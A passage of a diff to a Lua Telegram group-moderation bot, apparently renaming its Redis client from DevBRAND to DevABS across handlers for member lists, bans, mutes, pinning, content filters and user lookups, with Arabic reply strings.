 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد الرسائل الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
 Dev_BRAND(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
 else 
@@ -6177,8 +6177,8 @@ end
 if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 local Num = text:match("^اضف رسائل (%d+)$")
 function Reply(extra, result, success)
-DevBRAND:del(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
-DevBRAND:incrby(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
+DevABS:del(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
+DevABS:incrby(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة "..Num..' رساله', 1, 'md') 
 end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
@@ -6187,8 +6187,8 @@ end
 if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
 if Constructor(msg) then
 TXT = text:match("^اضف نقاط (%d+)$")
-DevBRAND:set('BRANDTTEAM:'..BRAND..'ids:user'..msg.chat_id_,TXT)  
-DevBRAND:setex('BRANDTTEAM:'..BRAND.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
+DevABS:set('BRANDTTEAM:'..BRAND..'ids:user'..msg.chat_id_,TXT)  
+DevABS:setex('BRANDTTEAM:'..BRAND.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد النقاط الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
 Dev_BRAND(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
 else 
@@ -6198,22 +6198,22 @@ end
 if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 local Num = text:match("^اضف نقاط (%d+)$")
 function Reply(extra, result, success)
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة "..Num..' نقطه', 1, 'md') 
 end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
 return false
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevBRAND:sadd(BRAND.."BRAND:cleaner"..msg.chat_id_, msg.id_) else DevBRAND:sadd(BRAND.."BRAND:cleaner"..msg.chat_id_, msg.id_) end end end
+if DevABS:get(BRAND..'BRAND:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevABS:sadd(BRAND.."BRAND:cleaner"..msg.chat_id_, msg.id_) else DevABS:sadd(BRAND.."BRAND:cleaner"..msg.chat_id_, msg.id_) end end end
 if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
 if text and text:match("^تثبيت$") and ChCheck(msg) then 
-if DevBRAND:sismember(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
+if DevABS:sismember(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
 Dev_BRAND(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
 return false  
 end
 tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
 if data.ID == "Ok" then
-DevBRAND:set(BRAND..'BRAND:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
+DevABS:set(BRAND..'BRAND:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تثبيت الرساله بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 return false  
@@ -6232,10 +6232,10 @@ end
 --     Source BRAND     --
 if Admin(msg) then
 if text == "المميزين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:VipMem:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:VipMem:'..msg.chat_id_)
 text = "⌁︙قائمة المميزين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6250,10 +6250,10 @@ end end
 if Manager(msg) then
 if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
 local BRAND =  'BRAND:Admins:'..msg.chat_id_
-local List = DevBRAND:smembers(BRAND..BRAND)
+local List = DevABS:smembers(BRAND..BRAND)
 text = "⌁︙قائمة الادمنيه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6267,10 +6267,10 @@ end end
 --     Source BRAND     -- 
 if Constructor(msg) then
 if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:Managers:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Managers:'..msg.chat_id_)
 text = "⌁︙قائمة المدراء ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6282,10 +6282,10 @@ end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 if text == "المنظفين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:Cleaner:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Cleaner:'..msg.chat_id_)
 text = "⌁︙قائمة المنظفين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6299,10 +6299,10 @@ end end
 --     Source BRAND     --
 if BasicConstructor(msg) then
 if text == "المنشئين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:Constructor:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Constructor:'..msg.chat_id_)
 text = "⌁︙قائمة المنشئين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6316,10 +6316,10 @@ end end
 --     Source BRAND     --
 if BRANDConstructor(msg) then
 if text == "المالكين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_)
 text = "⌁︙قائمة المالكين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6331,10 +6331,10 @@ end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_)
 text = "⌁︙قائمة المنشئين الاساسيين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6367,10 +6367,10 @@ end
 --     Source BRAND     --
 if Admin(msg) then
 if text == "المكتومين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:Muted:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Muted:'..msg.chat_id_)
 text = "⌁︙قائمة المكتومين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6383,10 +6383,10 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 --     Source BRAND     --
 if text == "المقيدين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:Tkeed:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Tkeed:'..msg.chat_id_)
 text = "⌁︙قائمة المقيدين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6399,10 +6399,10 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 --     Source BRAND     --
 if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:Ban:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Ban:'..msg.chat_id_)
 text = "⌁︙قائمة المحظورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6414,7 +6414,7 @@ end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 if text == "قائمه المنع" and ChCheck(msg) then
-local List = DevBRAND:hkeys(BRAND..'BRAND:Filters:'..msg.chat_id_)
+local List = DevABS:hkeys(BRAND..'BRAND:Filters:'..msg.chat_id_)
 text = "⌁︙قائمة المنع ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k, v in pairs(List) do
 text = text..k..'~ ❨ '..v..' ❩\n'
@@ -6427,10 +6427,10 @@ end
 end 
 --     Source BRAND     --
 if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
-local List = DevBRAND:smembers(BRAND..'User:Donky:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'User:Donky:'..msg.chat_id_)
 text = "⌁︙قائمة مطاية المجموعه 😹💔 ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6443,10 +6443,10 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end
 --     Source BRAND     --
 if text == "المطورين الثانويين" and SecondSudo(msg) or text == "الثانويين" and SecondSudo(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:SecondSudo:')
+local List = DevABS:smembers(BRAND..'BRAND:SecondSudo:')
 text = "⌁︙قائمة المطورين الثانويين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6460,12 +6460,12 @@ end
 --     Source BRAND     --
 if SudoBot(msg) then
 if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام ⌁" and ChCheck(msg) then 
-local BanAll = DevBRAND:smembers(BRAND..'BRAND:BanAll:')
-local MuteAll = DevBRAND:smembers(BRAND..'BRAND:MuteAll:')
+local BanAll = DevABS:smembers(BRAND..'BRAND:BanAll:')
+local MuteAll = DevABS:smembers(BRAND..'BRAND:MuteAll:')
 if #BanAll ~= 0 then 
 text = "⌁︙قائمة المحظورين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(BanAll) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6477,7 +6477,7 @@ end
 if #MuteAll ~= 0 then 
 text = text.."⌁︙قائمة المكتومين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(MuteAll) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6495,11 +6495,11 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 --     Source BRAND     --
 if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين ⌁" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:SudoBot:')
+local List = DevABS:smembers(BRAND..'BRAND:SudoBot:')
 text = "⌁︙قائمة المطورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local sudouser = DevBRAND:get(BRAND..'BRAND:Sudos'..v) 
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local sudouser = DevABS:get(BRAND..'BRAND:Sudos'..v) 
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
 else
@@ -6512,10 +6512,10 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 --     Source BRAND     --
 if text == "المدراء العامين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:ManagerAll:')
+local List = DevABS:smembers(BRAND..'BRAND:ManagerAll:')
 text = "⌁︙قائمة المدراء العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6528,10 +6528,10 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end
 --     Source BRAND     --
 if text == "المميزين عام" and ChCheck(msg) or text == "المميزين العامين" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND..'BRAND:VipAll:')
+local List = DevABS:smembers(BRAND..'BRAND:VipAll:')
 text = "⌁︙قائمة المميزين العام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6545,10 +6545,10 @@ end
 --     Source BRAND     -- 
 if text == "الادمنيه العامين" and ChCheck(msg) then 
 local BRAND =  'BRAND:AdminAll:'
-local List = DevBRAND:smembers(BRAND..BRAND)
+local List = DevABS:smembers(BRAND..BRAND)
 text = "⌁︙قائمة الادمنيه العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevBRAND:get(BRAND..'Save:UserName'..v)
+local username = DevABS:get(BRAND..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6575,7 +6575,7 @@ return false
 end
 local UserName = (dp.username_ or "CXRCX")
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
-DevBRAND:sadd(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,dp.id_)
+DevABS:sadd(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,dp.id_)
 end,nil)   
 end,nil)   
 end
@@ -6586,19 +6586,19 @@ if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) 
 function filter_by_reply(extra, result, success) 
 if result.content_.sticker_ then
 local idsticker = result.content_.sticker_.sticker_.persistent_id_
-DevBRAND:sadd(BRAND.."BRAND:FilterSteckr"..msg.chat_id_,idsticker)
+DevABS:sadd(BRAND.."BRAND:FilterSteckr"..msg.chat_id_,idsticker)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
 return false
 end
 if result.content_.ID == "MessagePhoto" then
 local photo = result.content_.photo_.id_
-DevBRAND:sadd(BRAND.."BRAND:FilterPhoto"..msg.chat_id_,photo)
+DevABS:sadd(BRAND.."BRAND:FilterPhoto"..msg.chat_id_,photo)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
 return false
 end
 if result.content_.animation_ then
 local idanimation = result.content_.animation_.animation_.persistent_id_
-DevBRAND:sadd(BRAND.."BRAND:FilterAnimation"..msg.chat_id_,idanimation)
+DevABS:sadd(BRAND.."BRAND:FilterAnimation"..msg.chat_id_,idanimation)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
 return false
 end
@@ -6610,19 +6610,19 @@ if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and Ch
 function unfilter_by_reply(extra, result, success) 
 if result.content_.sticker_ then
 local idsticker = result.content_.sticker_.sticker_.persistent_id_
-DevBRAND:srem(BRAND.."BRAND:FilterSteckr"..msg.chat_id_,idsticker)
+DevABS:srem(BRAND.."BRAND:FilterSteckr"..msg.chat_id_,idsticker)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
 return false
 end
 if result.content_.ID == "MessagePhoto" then
 local photo = result.content_.photo_.id_
-DevBRAND:srem(BRAND.."BRAND:FilterPhoto"..msg.chat_id_,photo)
+DevABS:srem(BRAND.."BRAND:FilterPhoto"..msg.chat_id_,photo)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
 return false
 end
 if result.content_.animation_.animation_ then
 local idanimation = result.content_.animation_.animation_.persistent_id_
-DevBRAND:srem(BRAND.."BRAND:FilterAnimation"..msg.chat_id_,idanimation)
+DevABS:srem(BRAND.."BRAND:FilterAnimation"..msg.chat_id_,idanimation)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
 return false
 end
@@ -6634,14 +6634,14 @@ end
 if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل تحويل الصيغ'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Thwel:BRAND'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Thwel:BRAND'..msg.chat_id_) 
 end
 if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل تحويل الصيغ'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Thwel:BRAND'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Thwel:BRAND'..msg.chat_id_,true)  
 end
-if text == 'تحويل' and not DevBRAND:get(BRAND..'BRAND:Thwel:BRAND'..msg.chat_id_) and SourceCh(msg) then  
+if text == 'تحويل' and not DevABS:get(BRAND..'BRAND:Thwel:BRAND'..msg.chat_id_) and SourceCh(msg) then  
 if tonumber(msg.reply_to_message_id_) > 0 then 
 function ThwelByReply(extra, result, success)
 if result.content_.photo_ then 
@@ -6676,17 +6676,17 @@ end
 if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
 function id_by_reply(extra, result, success) 
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-local user_msgs = DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
-local user_nkt = tonumber(DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..data.id_) or 0)
-if DevBRAND:sismember(BRAND..'BRAND:BanAll:',result.sender_user_id_) then
+local user_msgs = DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
+local user_nkt = tonumber(DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..data.id_) or 0)
+if DevABS:sismember(BRAND..'BRAND:BanAll:',result.sender_user_id_) then
 Tkeed = 'محظور عام'
-elseif DevBRAND:sismember(BRAND..'BRAND:MuteAll:',result.sender_user_id_) then
+elseif DevABS:sismember(BRAND..'BRAND:MuteAll:',result.sender_user_id_) then
 Tkeed = 'مكتوم عام'
-elseif DevBRAND:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,result.sender_user_id_) then
+elseif DevABS:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,result.sender_user_id_) then
 Tkeed = 'محظور'
-elseif DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,result.sender_user_id_) then
+elseif DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,result.sender_user_id_) then
 Tkeed = 'مكتوم'
-elseif DevBRAND:sismember(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
+elseif DevABS:sismember(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
 Tkeed = 'مقيد'
 else
 Tkeed = false
@@ -6696,8 +6696,8 @@ Tked = '\n⌁︙القيود ↫ '..Tkeed
 else 
 Tked = '' 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
-sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevBRAND:get(BRAND..'BRAND:Sudos'..result.sender_user_id_) or 0)..'' 
+if DevABS:sismember(BRAND..'BRAND:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
+sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevABS:get(BRAND..'BRAND:Sudos'..result.sender_user_id_) or 0)..'' 
 else 
 sudobot = '' 
 end
@@ -6738,17 +6738,17 @@ end
 return false  end
 if res.id_ then  
 tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
-local user_msgs = DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
-local user_nkt = tonumber(DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..res.id_) or 0)
-if DevBRAND:sismember(BRAND..'BRAND:BanAll:',res.id_) then
+local user_msgs = DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
+local user_nkt = tonumber(DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..res.id_) or 0)
+if DevABS:sismember(BRAND..'BRAND:BanAll:',res.id_) then
 Tkeed = 'محظور عام'
-elseif DevBRAND:sismember(BRAND..'BRAND:MuteAll:',res.id_) then
+elseif DevABS:sismember(BRAND..'BRAND:MuteAll:',res.id_) then
 Tkeed = 'مكتوم عام'
-elseif DevBRAND:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,res.id_) then
+elseif DevABS:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,res.id_) then
 Tkeed = 'محظور'
-elseif DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,res.id_) then
+elseif DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,res.id_) then
 Tkeed = 'مكتوم'
-elseif DevBRAND:sismember(BRAND..'BRAND:Tkeed:'..msg.chat_id_,res.id_) then
+elseif DevABS:sismember(BRAND..'BRAND:Tkeed:'..msg.chat_id_,res.id_) then
 Tkeed = 'مقيد'
 else
 Tkeed = false
@@ -6758,8 +6758,8 @@ Tked = '\n⌁︙القيود ↫ '..Tkeed
 else 
 Tked = '' 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SudoBot:',res.id_) and SudoBot(msg) then
-sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevBRAND:get(BRAND..'BRAND:Sudos'..res.id_) or 0)..'' 
+if DevABS:sismember(BRAND..'BRAND:SudoBot:',res.id_) and SudoBot(msg) then
+sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevABS:get(BRAND..'BRAND:Sudos'..res.id_) or 0)..'' 
 else 
 sudobot = '' 
 end
@@ -6784,17 +6784,17 @@ if data.message_ == "User not found" then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لم يتم التعرف على الحساب', 1, 'md')
 return false  
 end
-local user_msgs = DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
-local user_nkt = tonumber(DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..iduser) or 0)
-if DevBRAND:sismember(BRAND..'BRAND:BanAll:',iduser) then
+local user_msgs = DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
+local user_nkt = tonumber(DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..iduser) or 0)
+if DevABS:sismember(BRAND..'BRAND:BanAll:',iduser) then
 Tkeed = 'محظور عام'
-elseif DevBRAND:sismember(BRAND..'BRAND:MuteAll:',iduser) then
+elseif DevABS:sismember(BRAND..'BRAND:MuteAll:',iduser) then
 Tkeed = 'مكتوم عام'
-elseif DevBRAND:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,iduser) then
+elseif DevABS:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,iduser) then
 Tkeed = 'محظور'
-elseif DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,iduser) then
+elseif DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,iduser) then
 Tkeed = 'مكتوم'
-elseif DevBRAND:sismember(BRAND..'BRAND:Tkeed:'..msg.chat_id_,iduser) then
+elseif DevABS:sismember(BRAND..'BRAND:Tkeed:'..msg.chat_id_,iduser) then
 Tkeed = 'مقيد'
 else
 Tkeed = false
@@ -6804,8 +6804,8 @@ Tked = '\n⌁︙القيود ↫ '..Tkeed
 else 
 Tked = '' 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SudoBot:',iduser) and SudoBot(msg) then
-sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevBRAND:get(BRAND..'BRAND:Sudos'..iduser) or 0)..'' 
+if DevABS:sismember(BRAND..'BRAND:SudoBot:',iduser) and SudoBot(msg) then
+sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevABS:get(BRAND..'BRAND:Sudos'..iduser) or 0)..'' 
 else 
 sudobot = '' 
 end
@@ -6829,11 +6829,11 @@ end
 --     Source BRAND     --
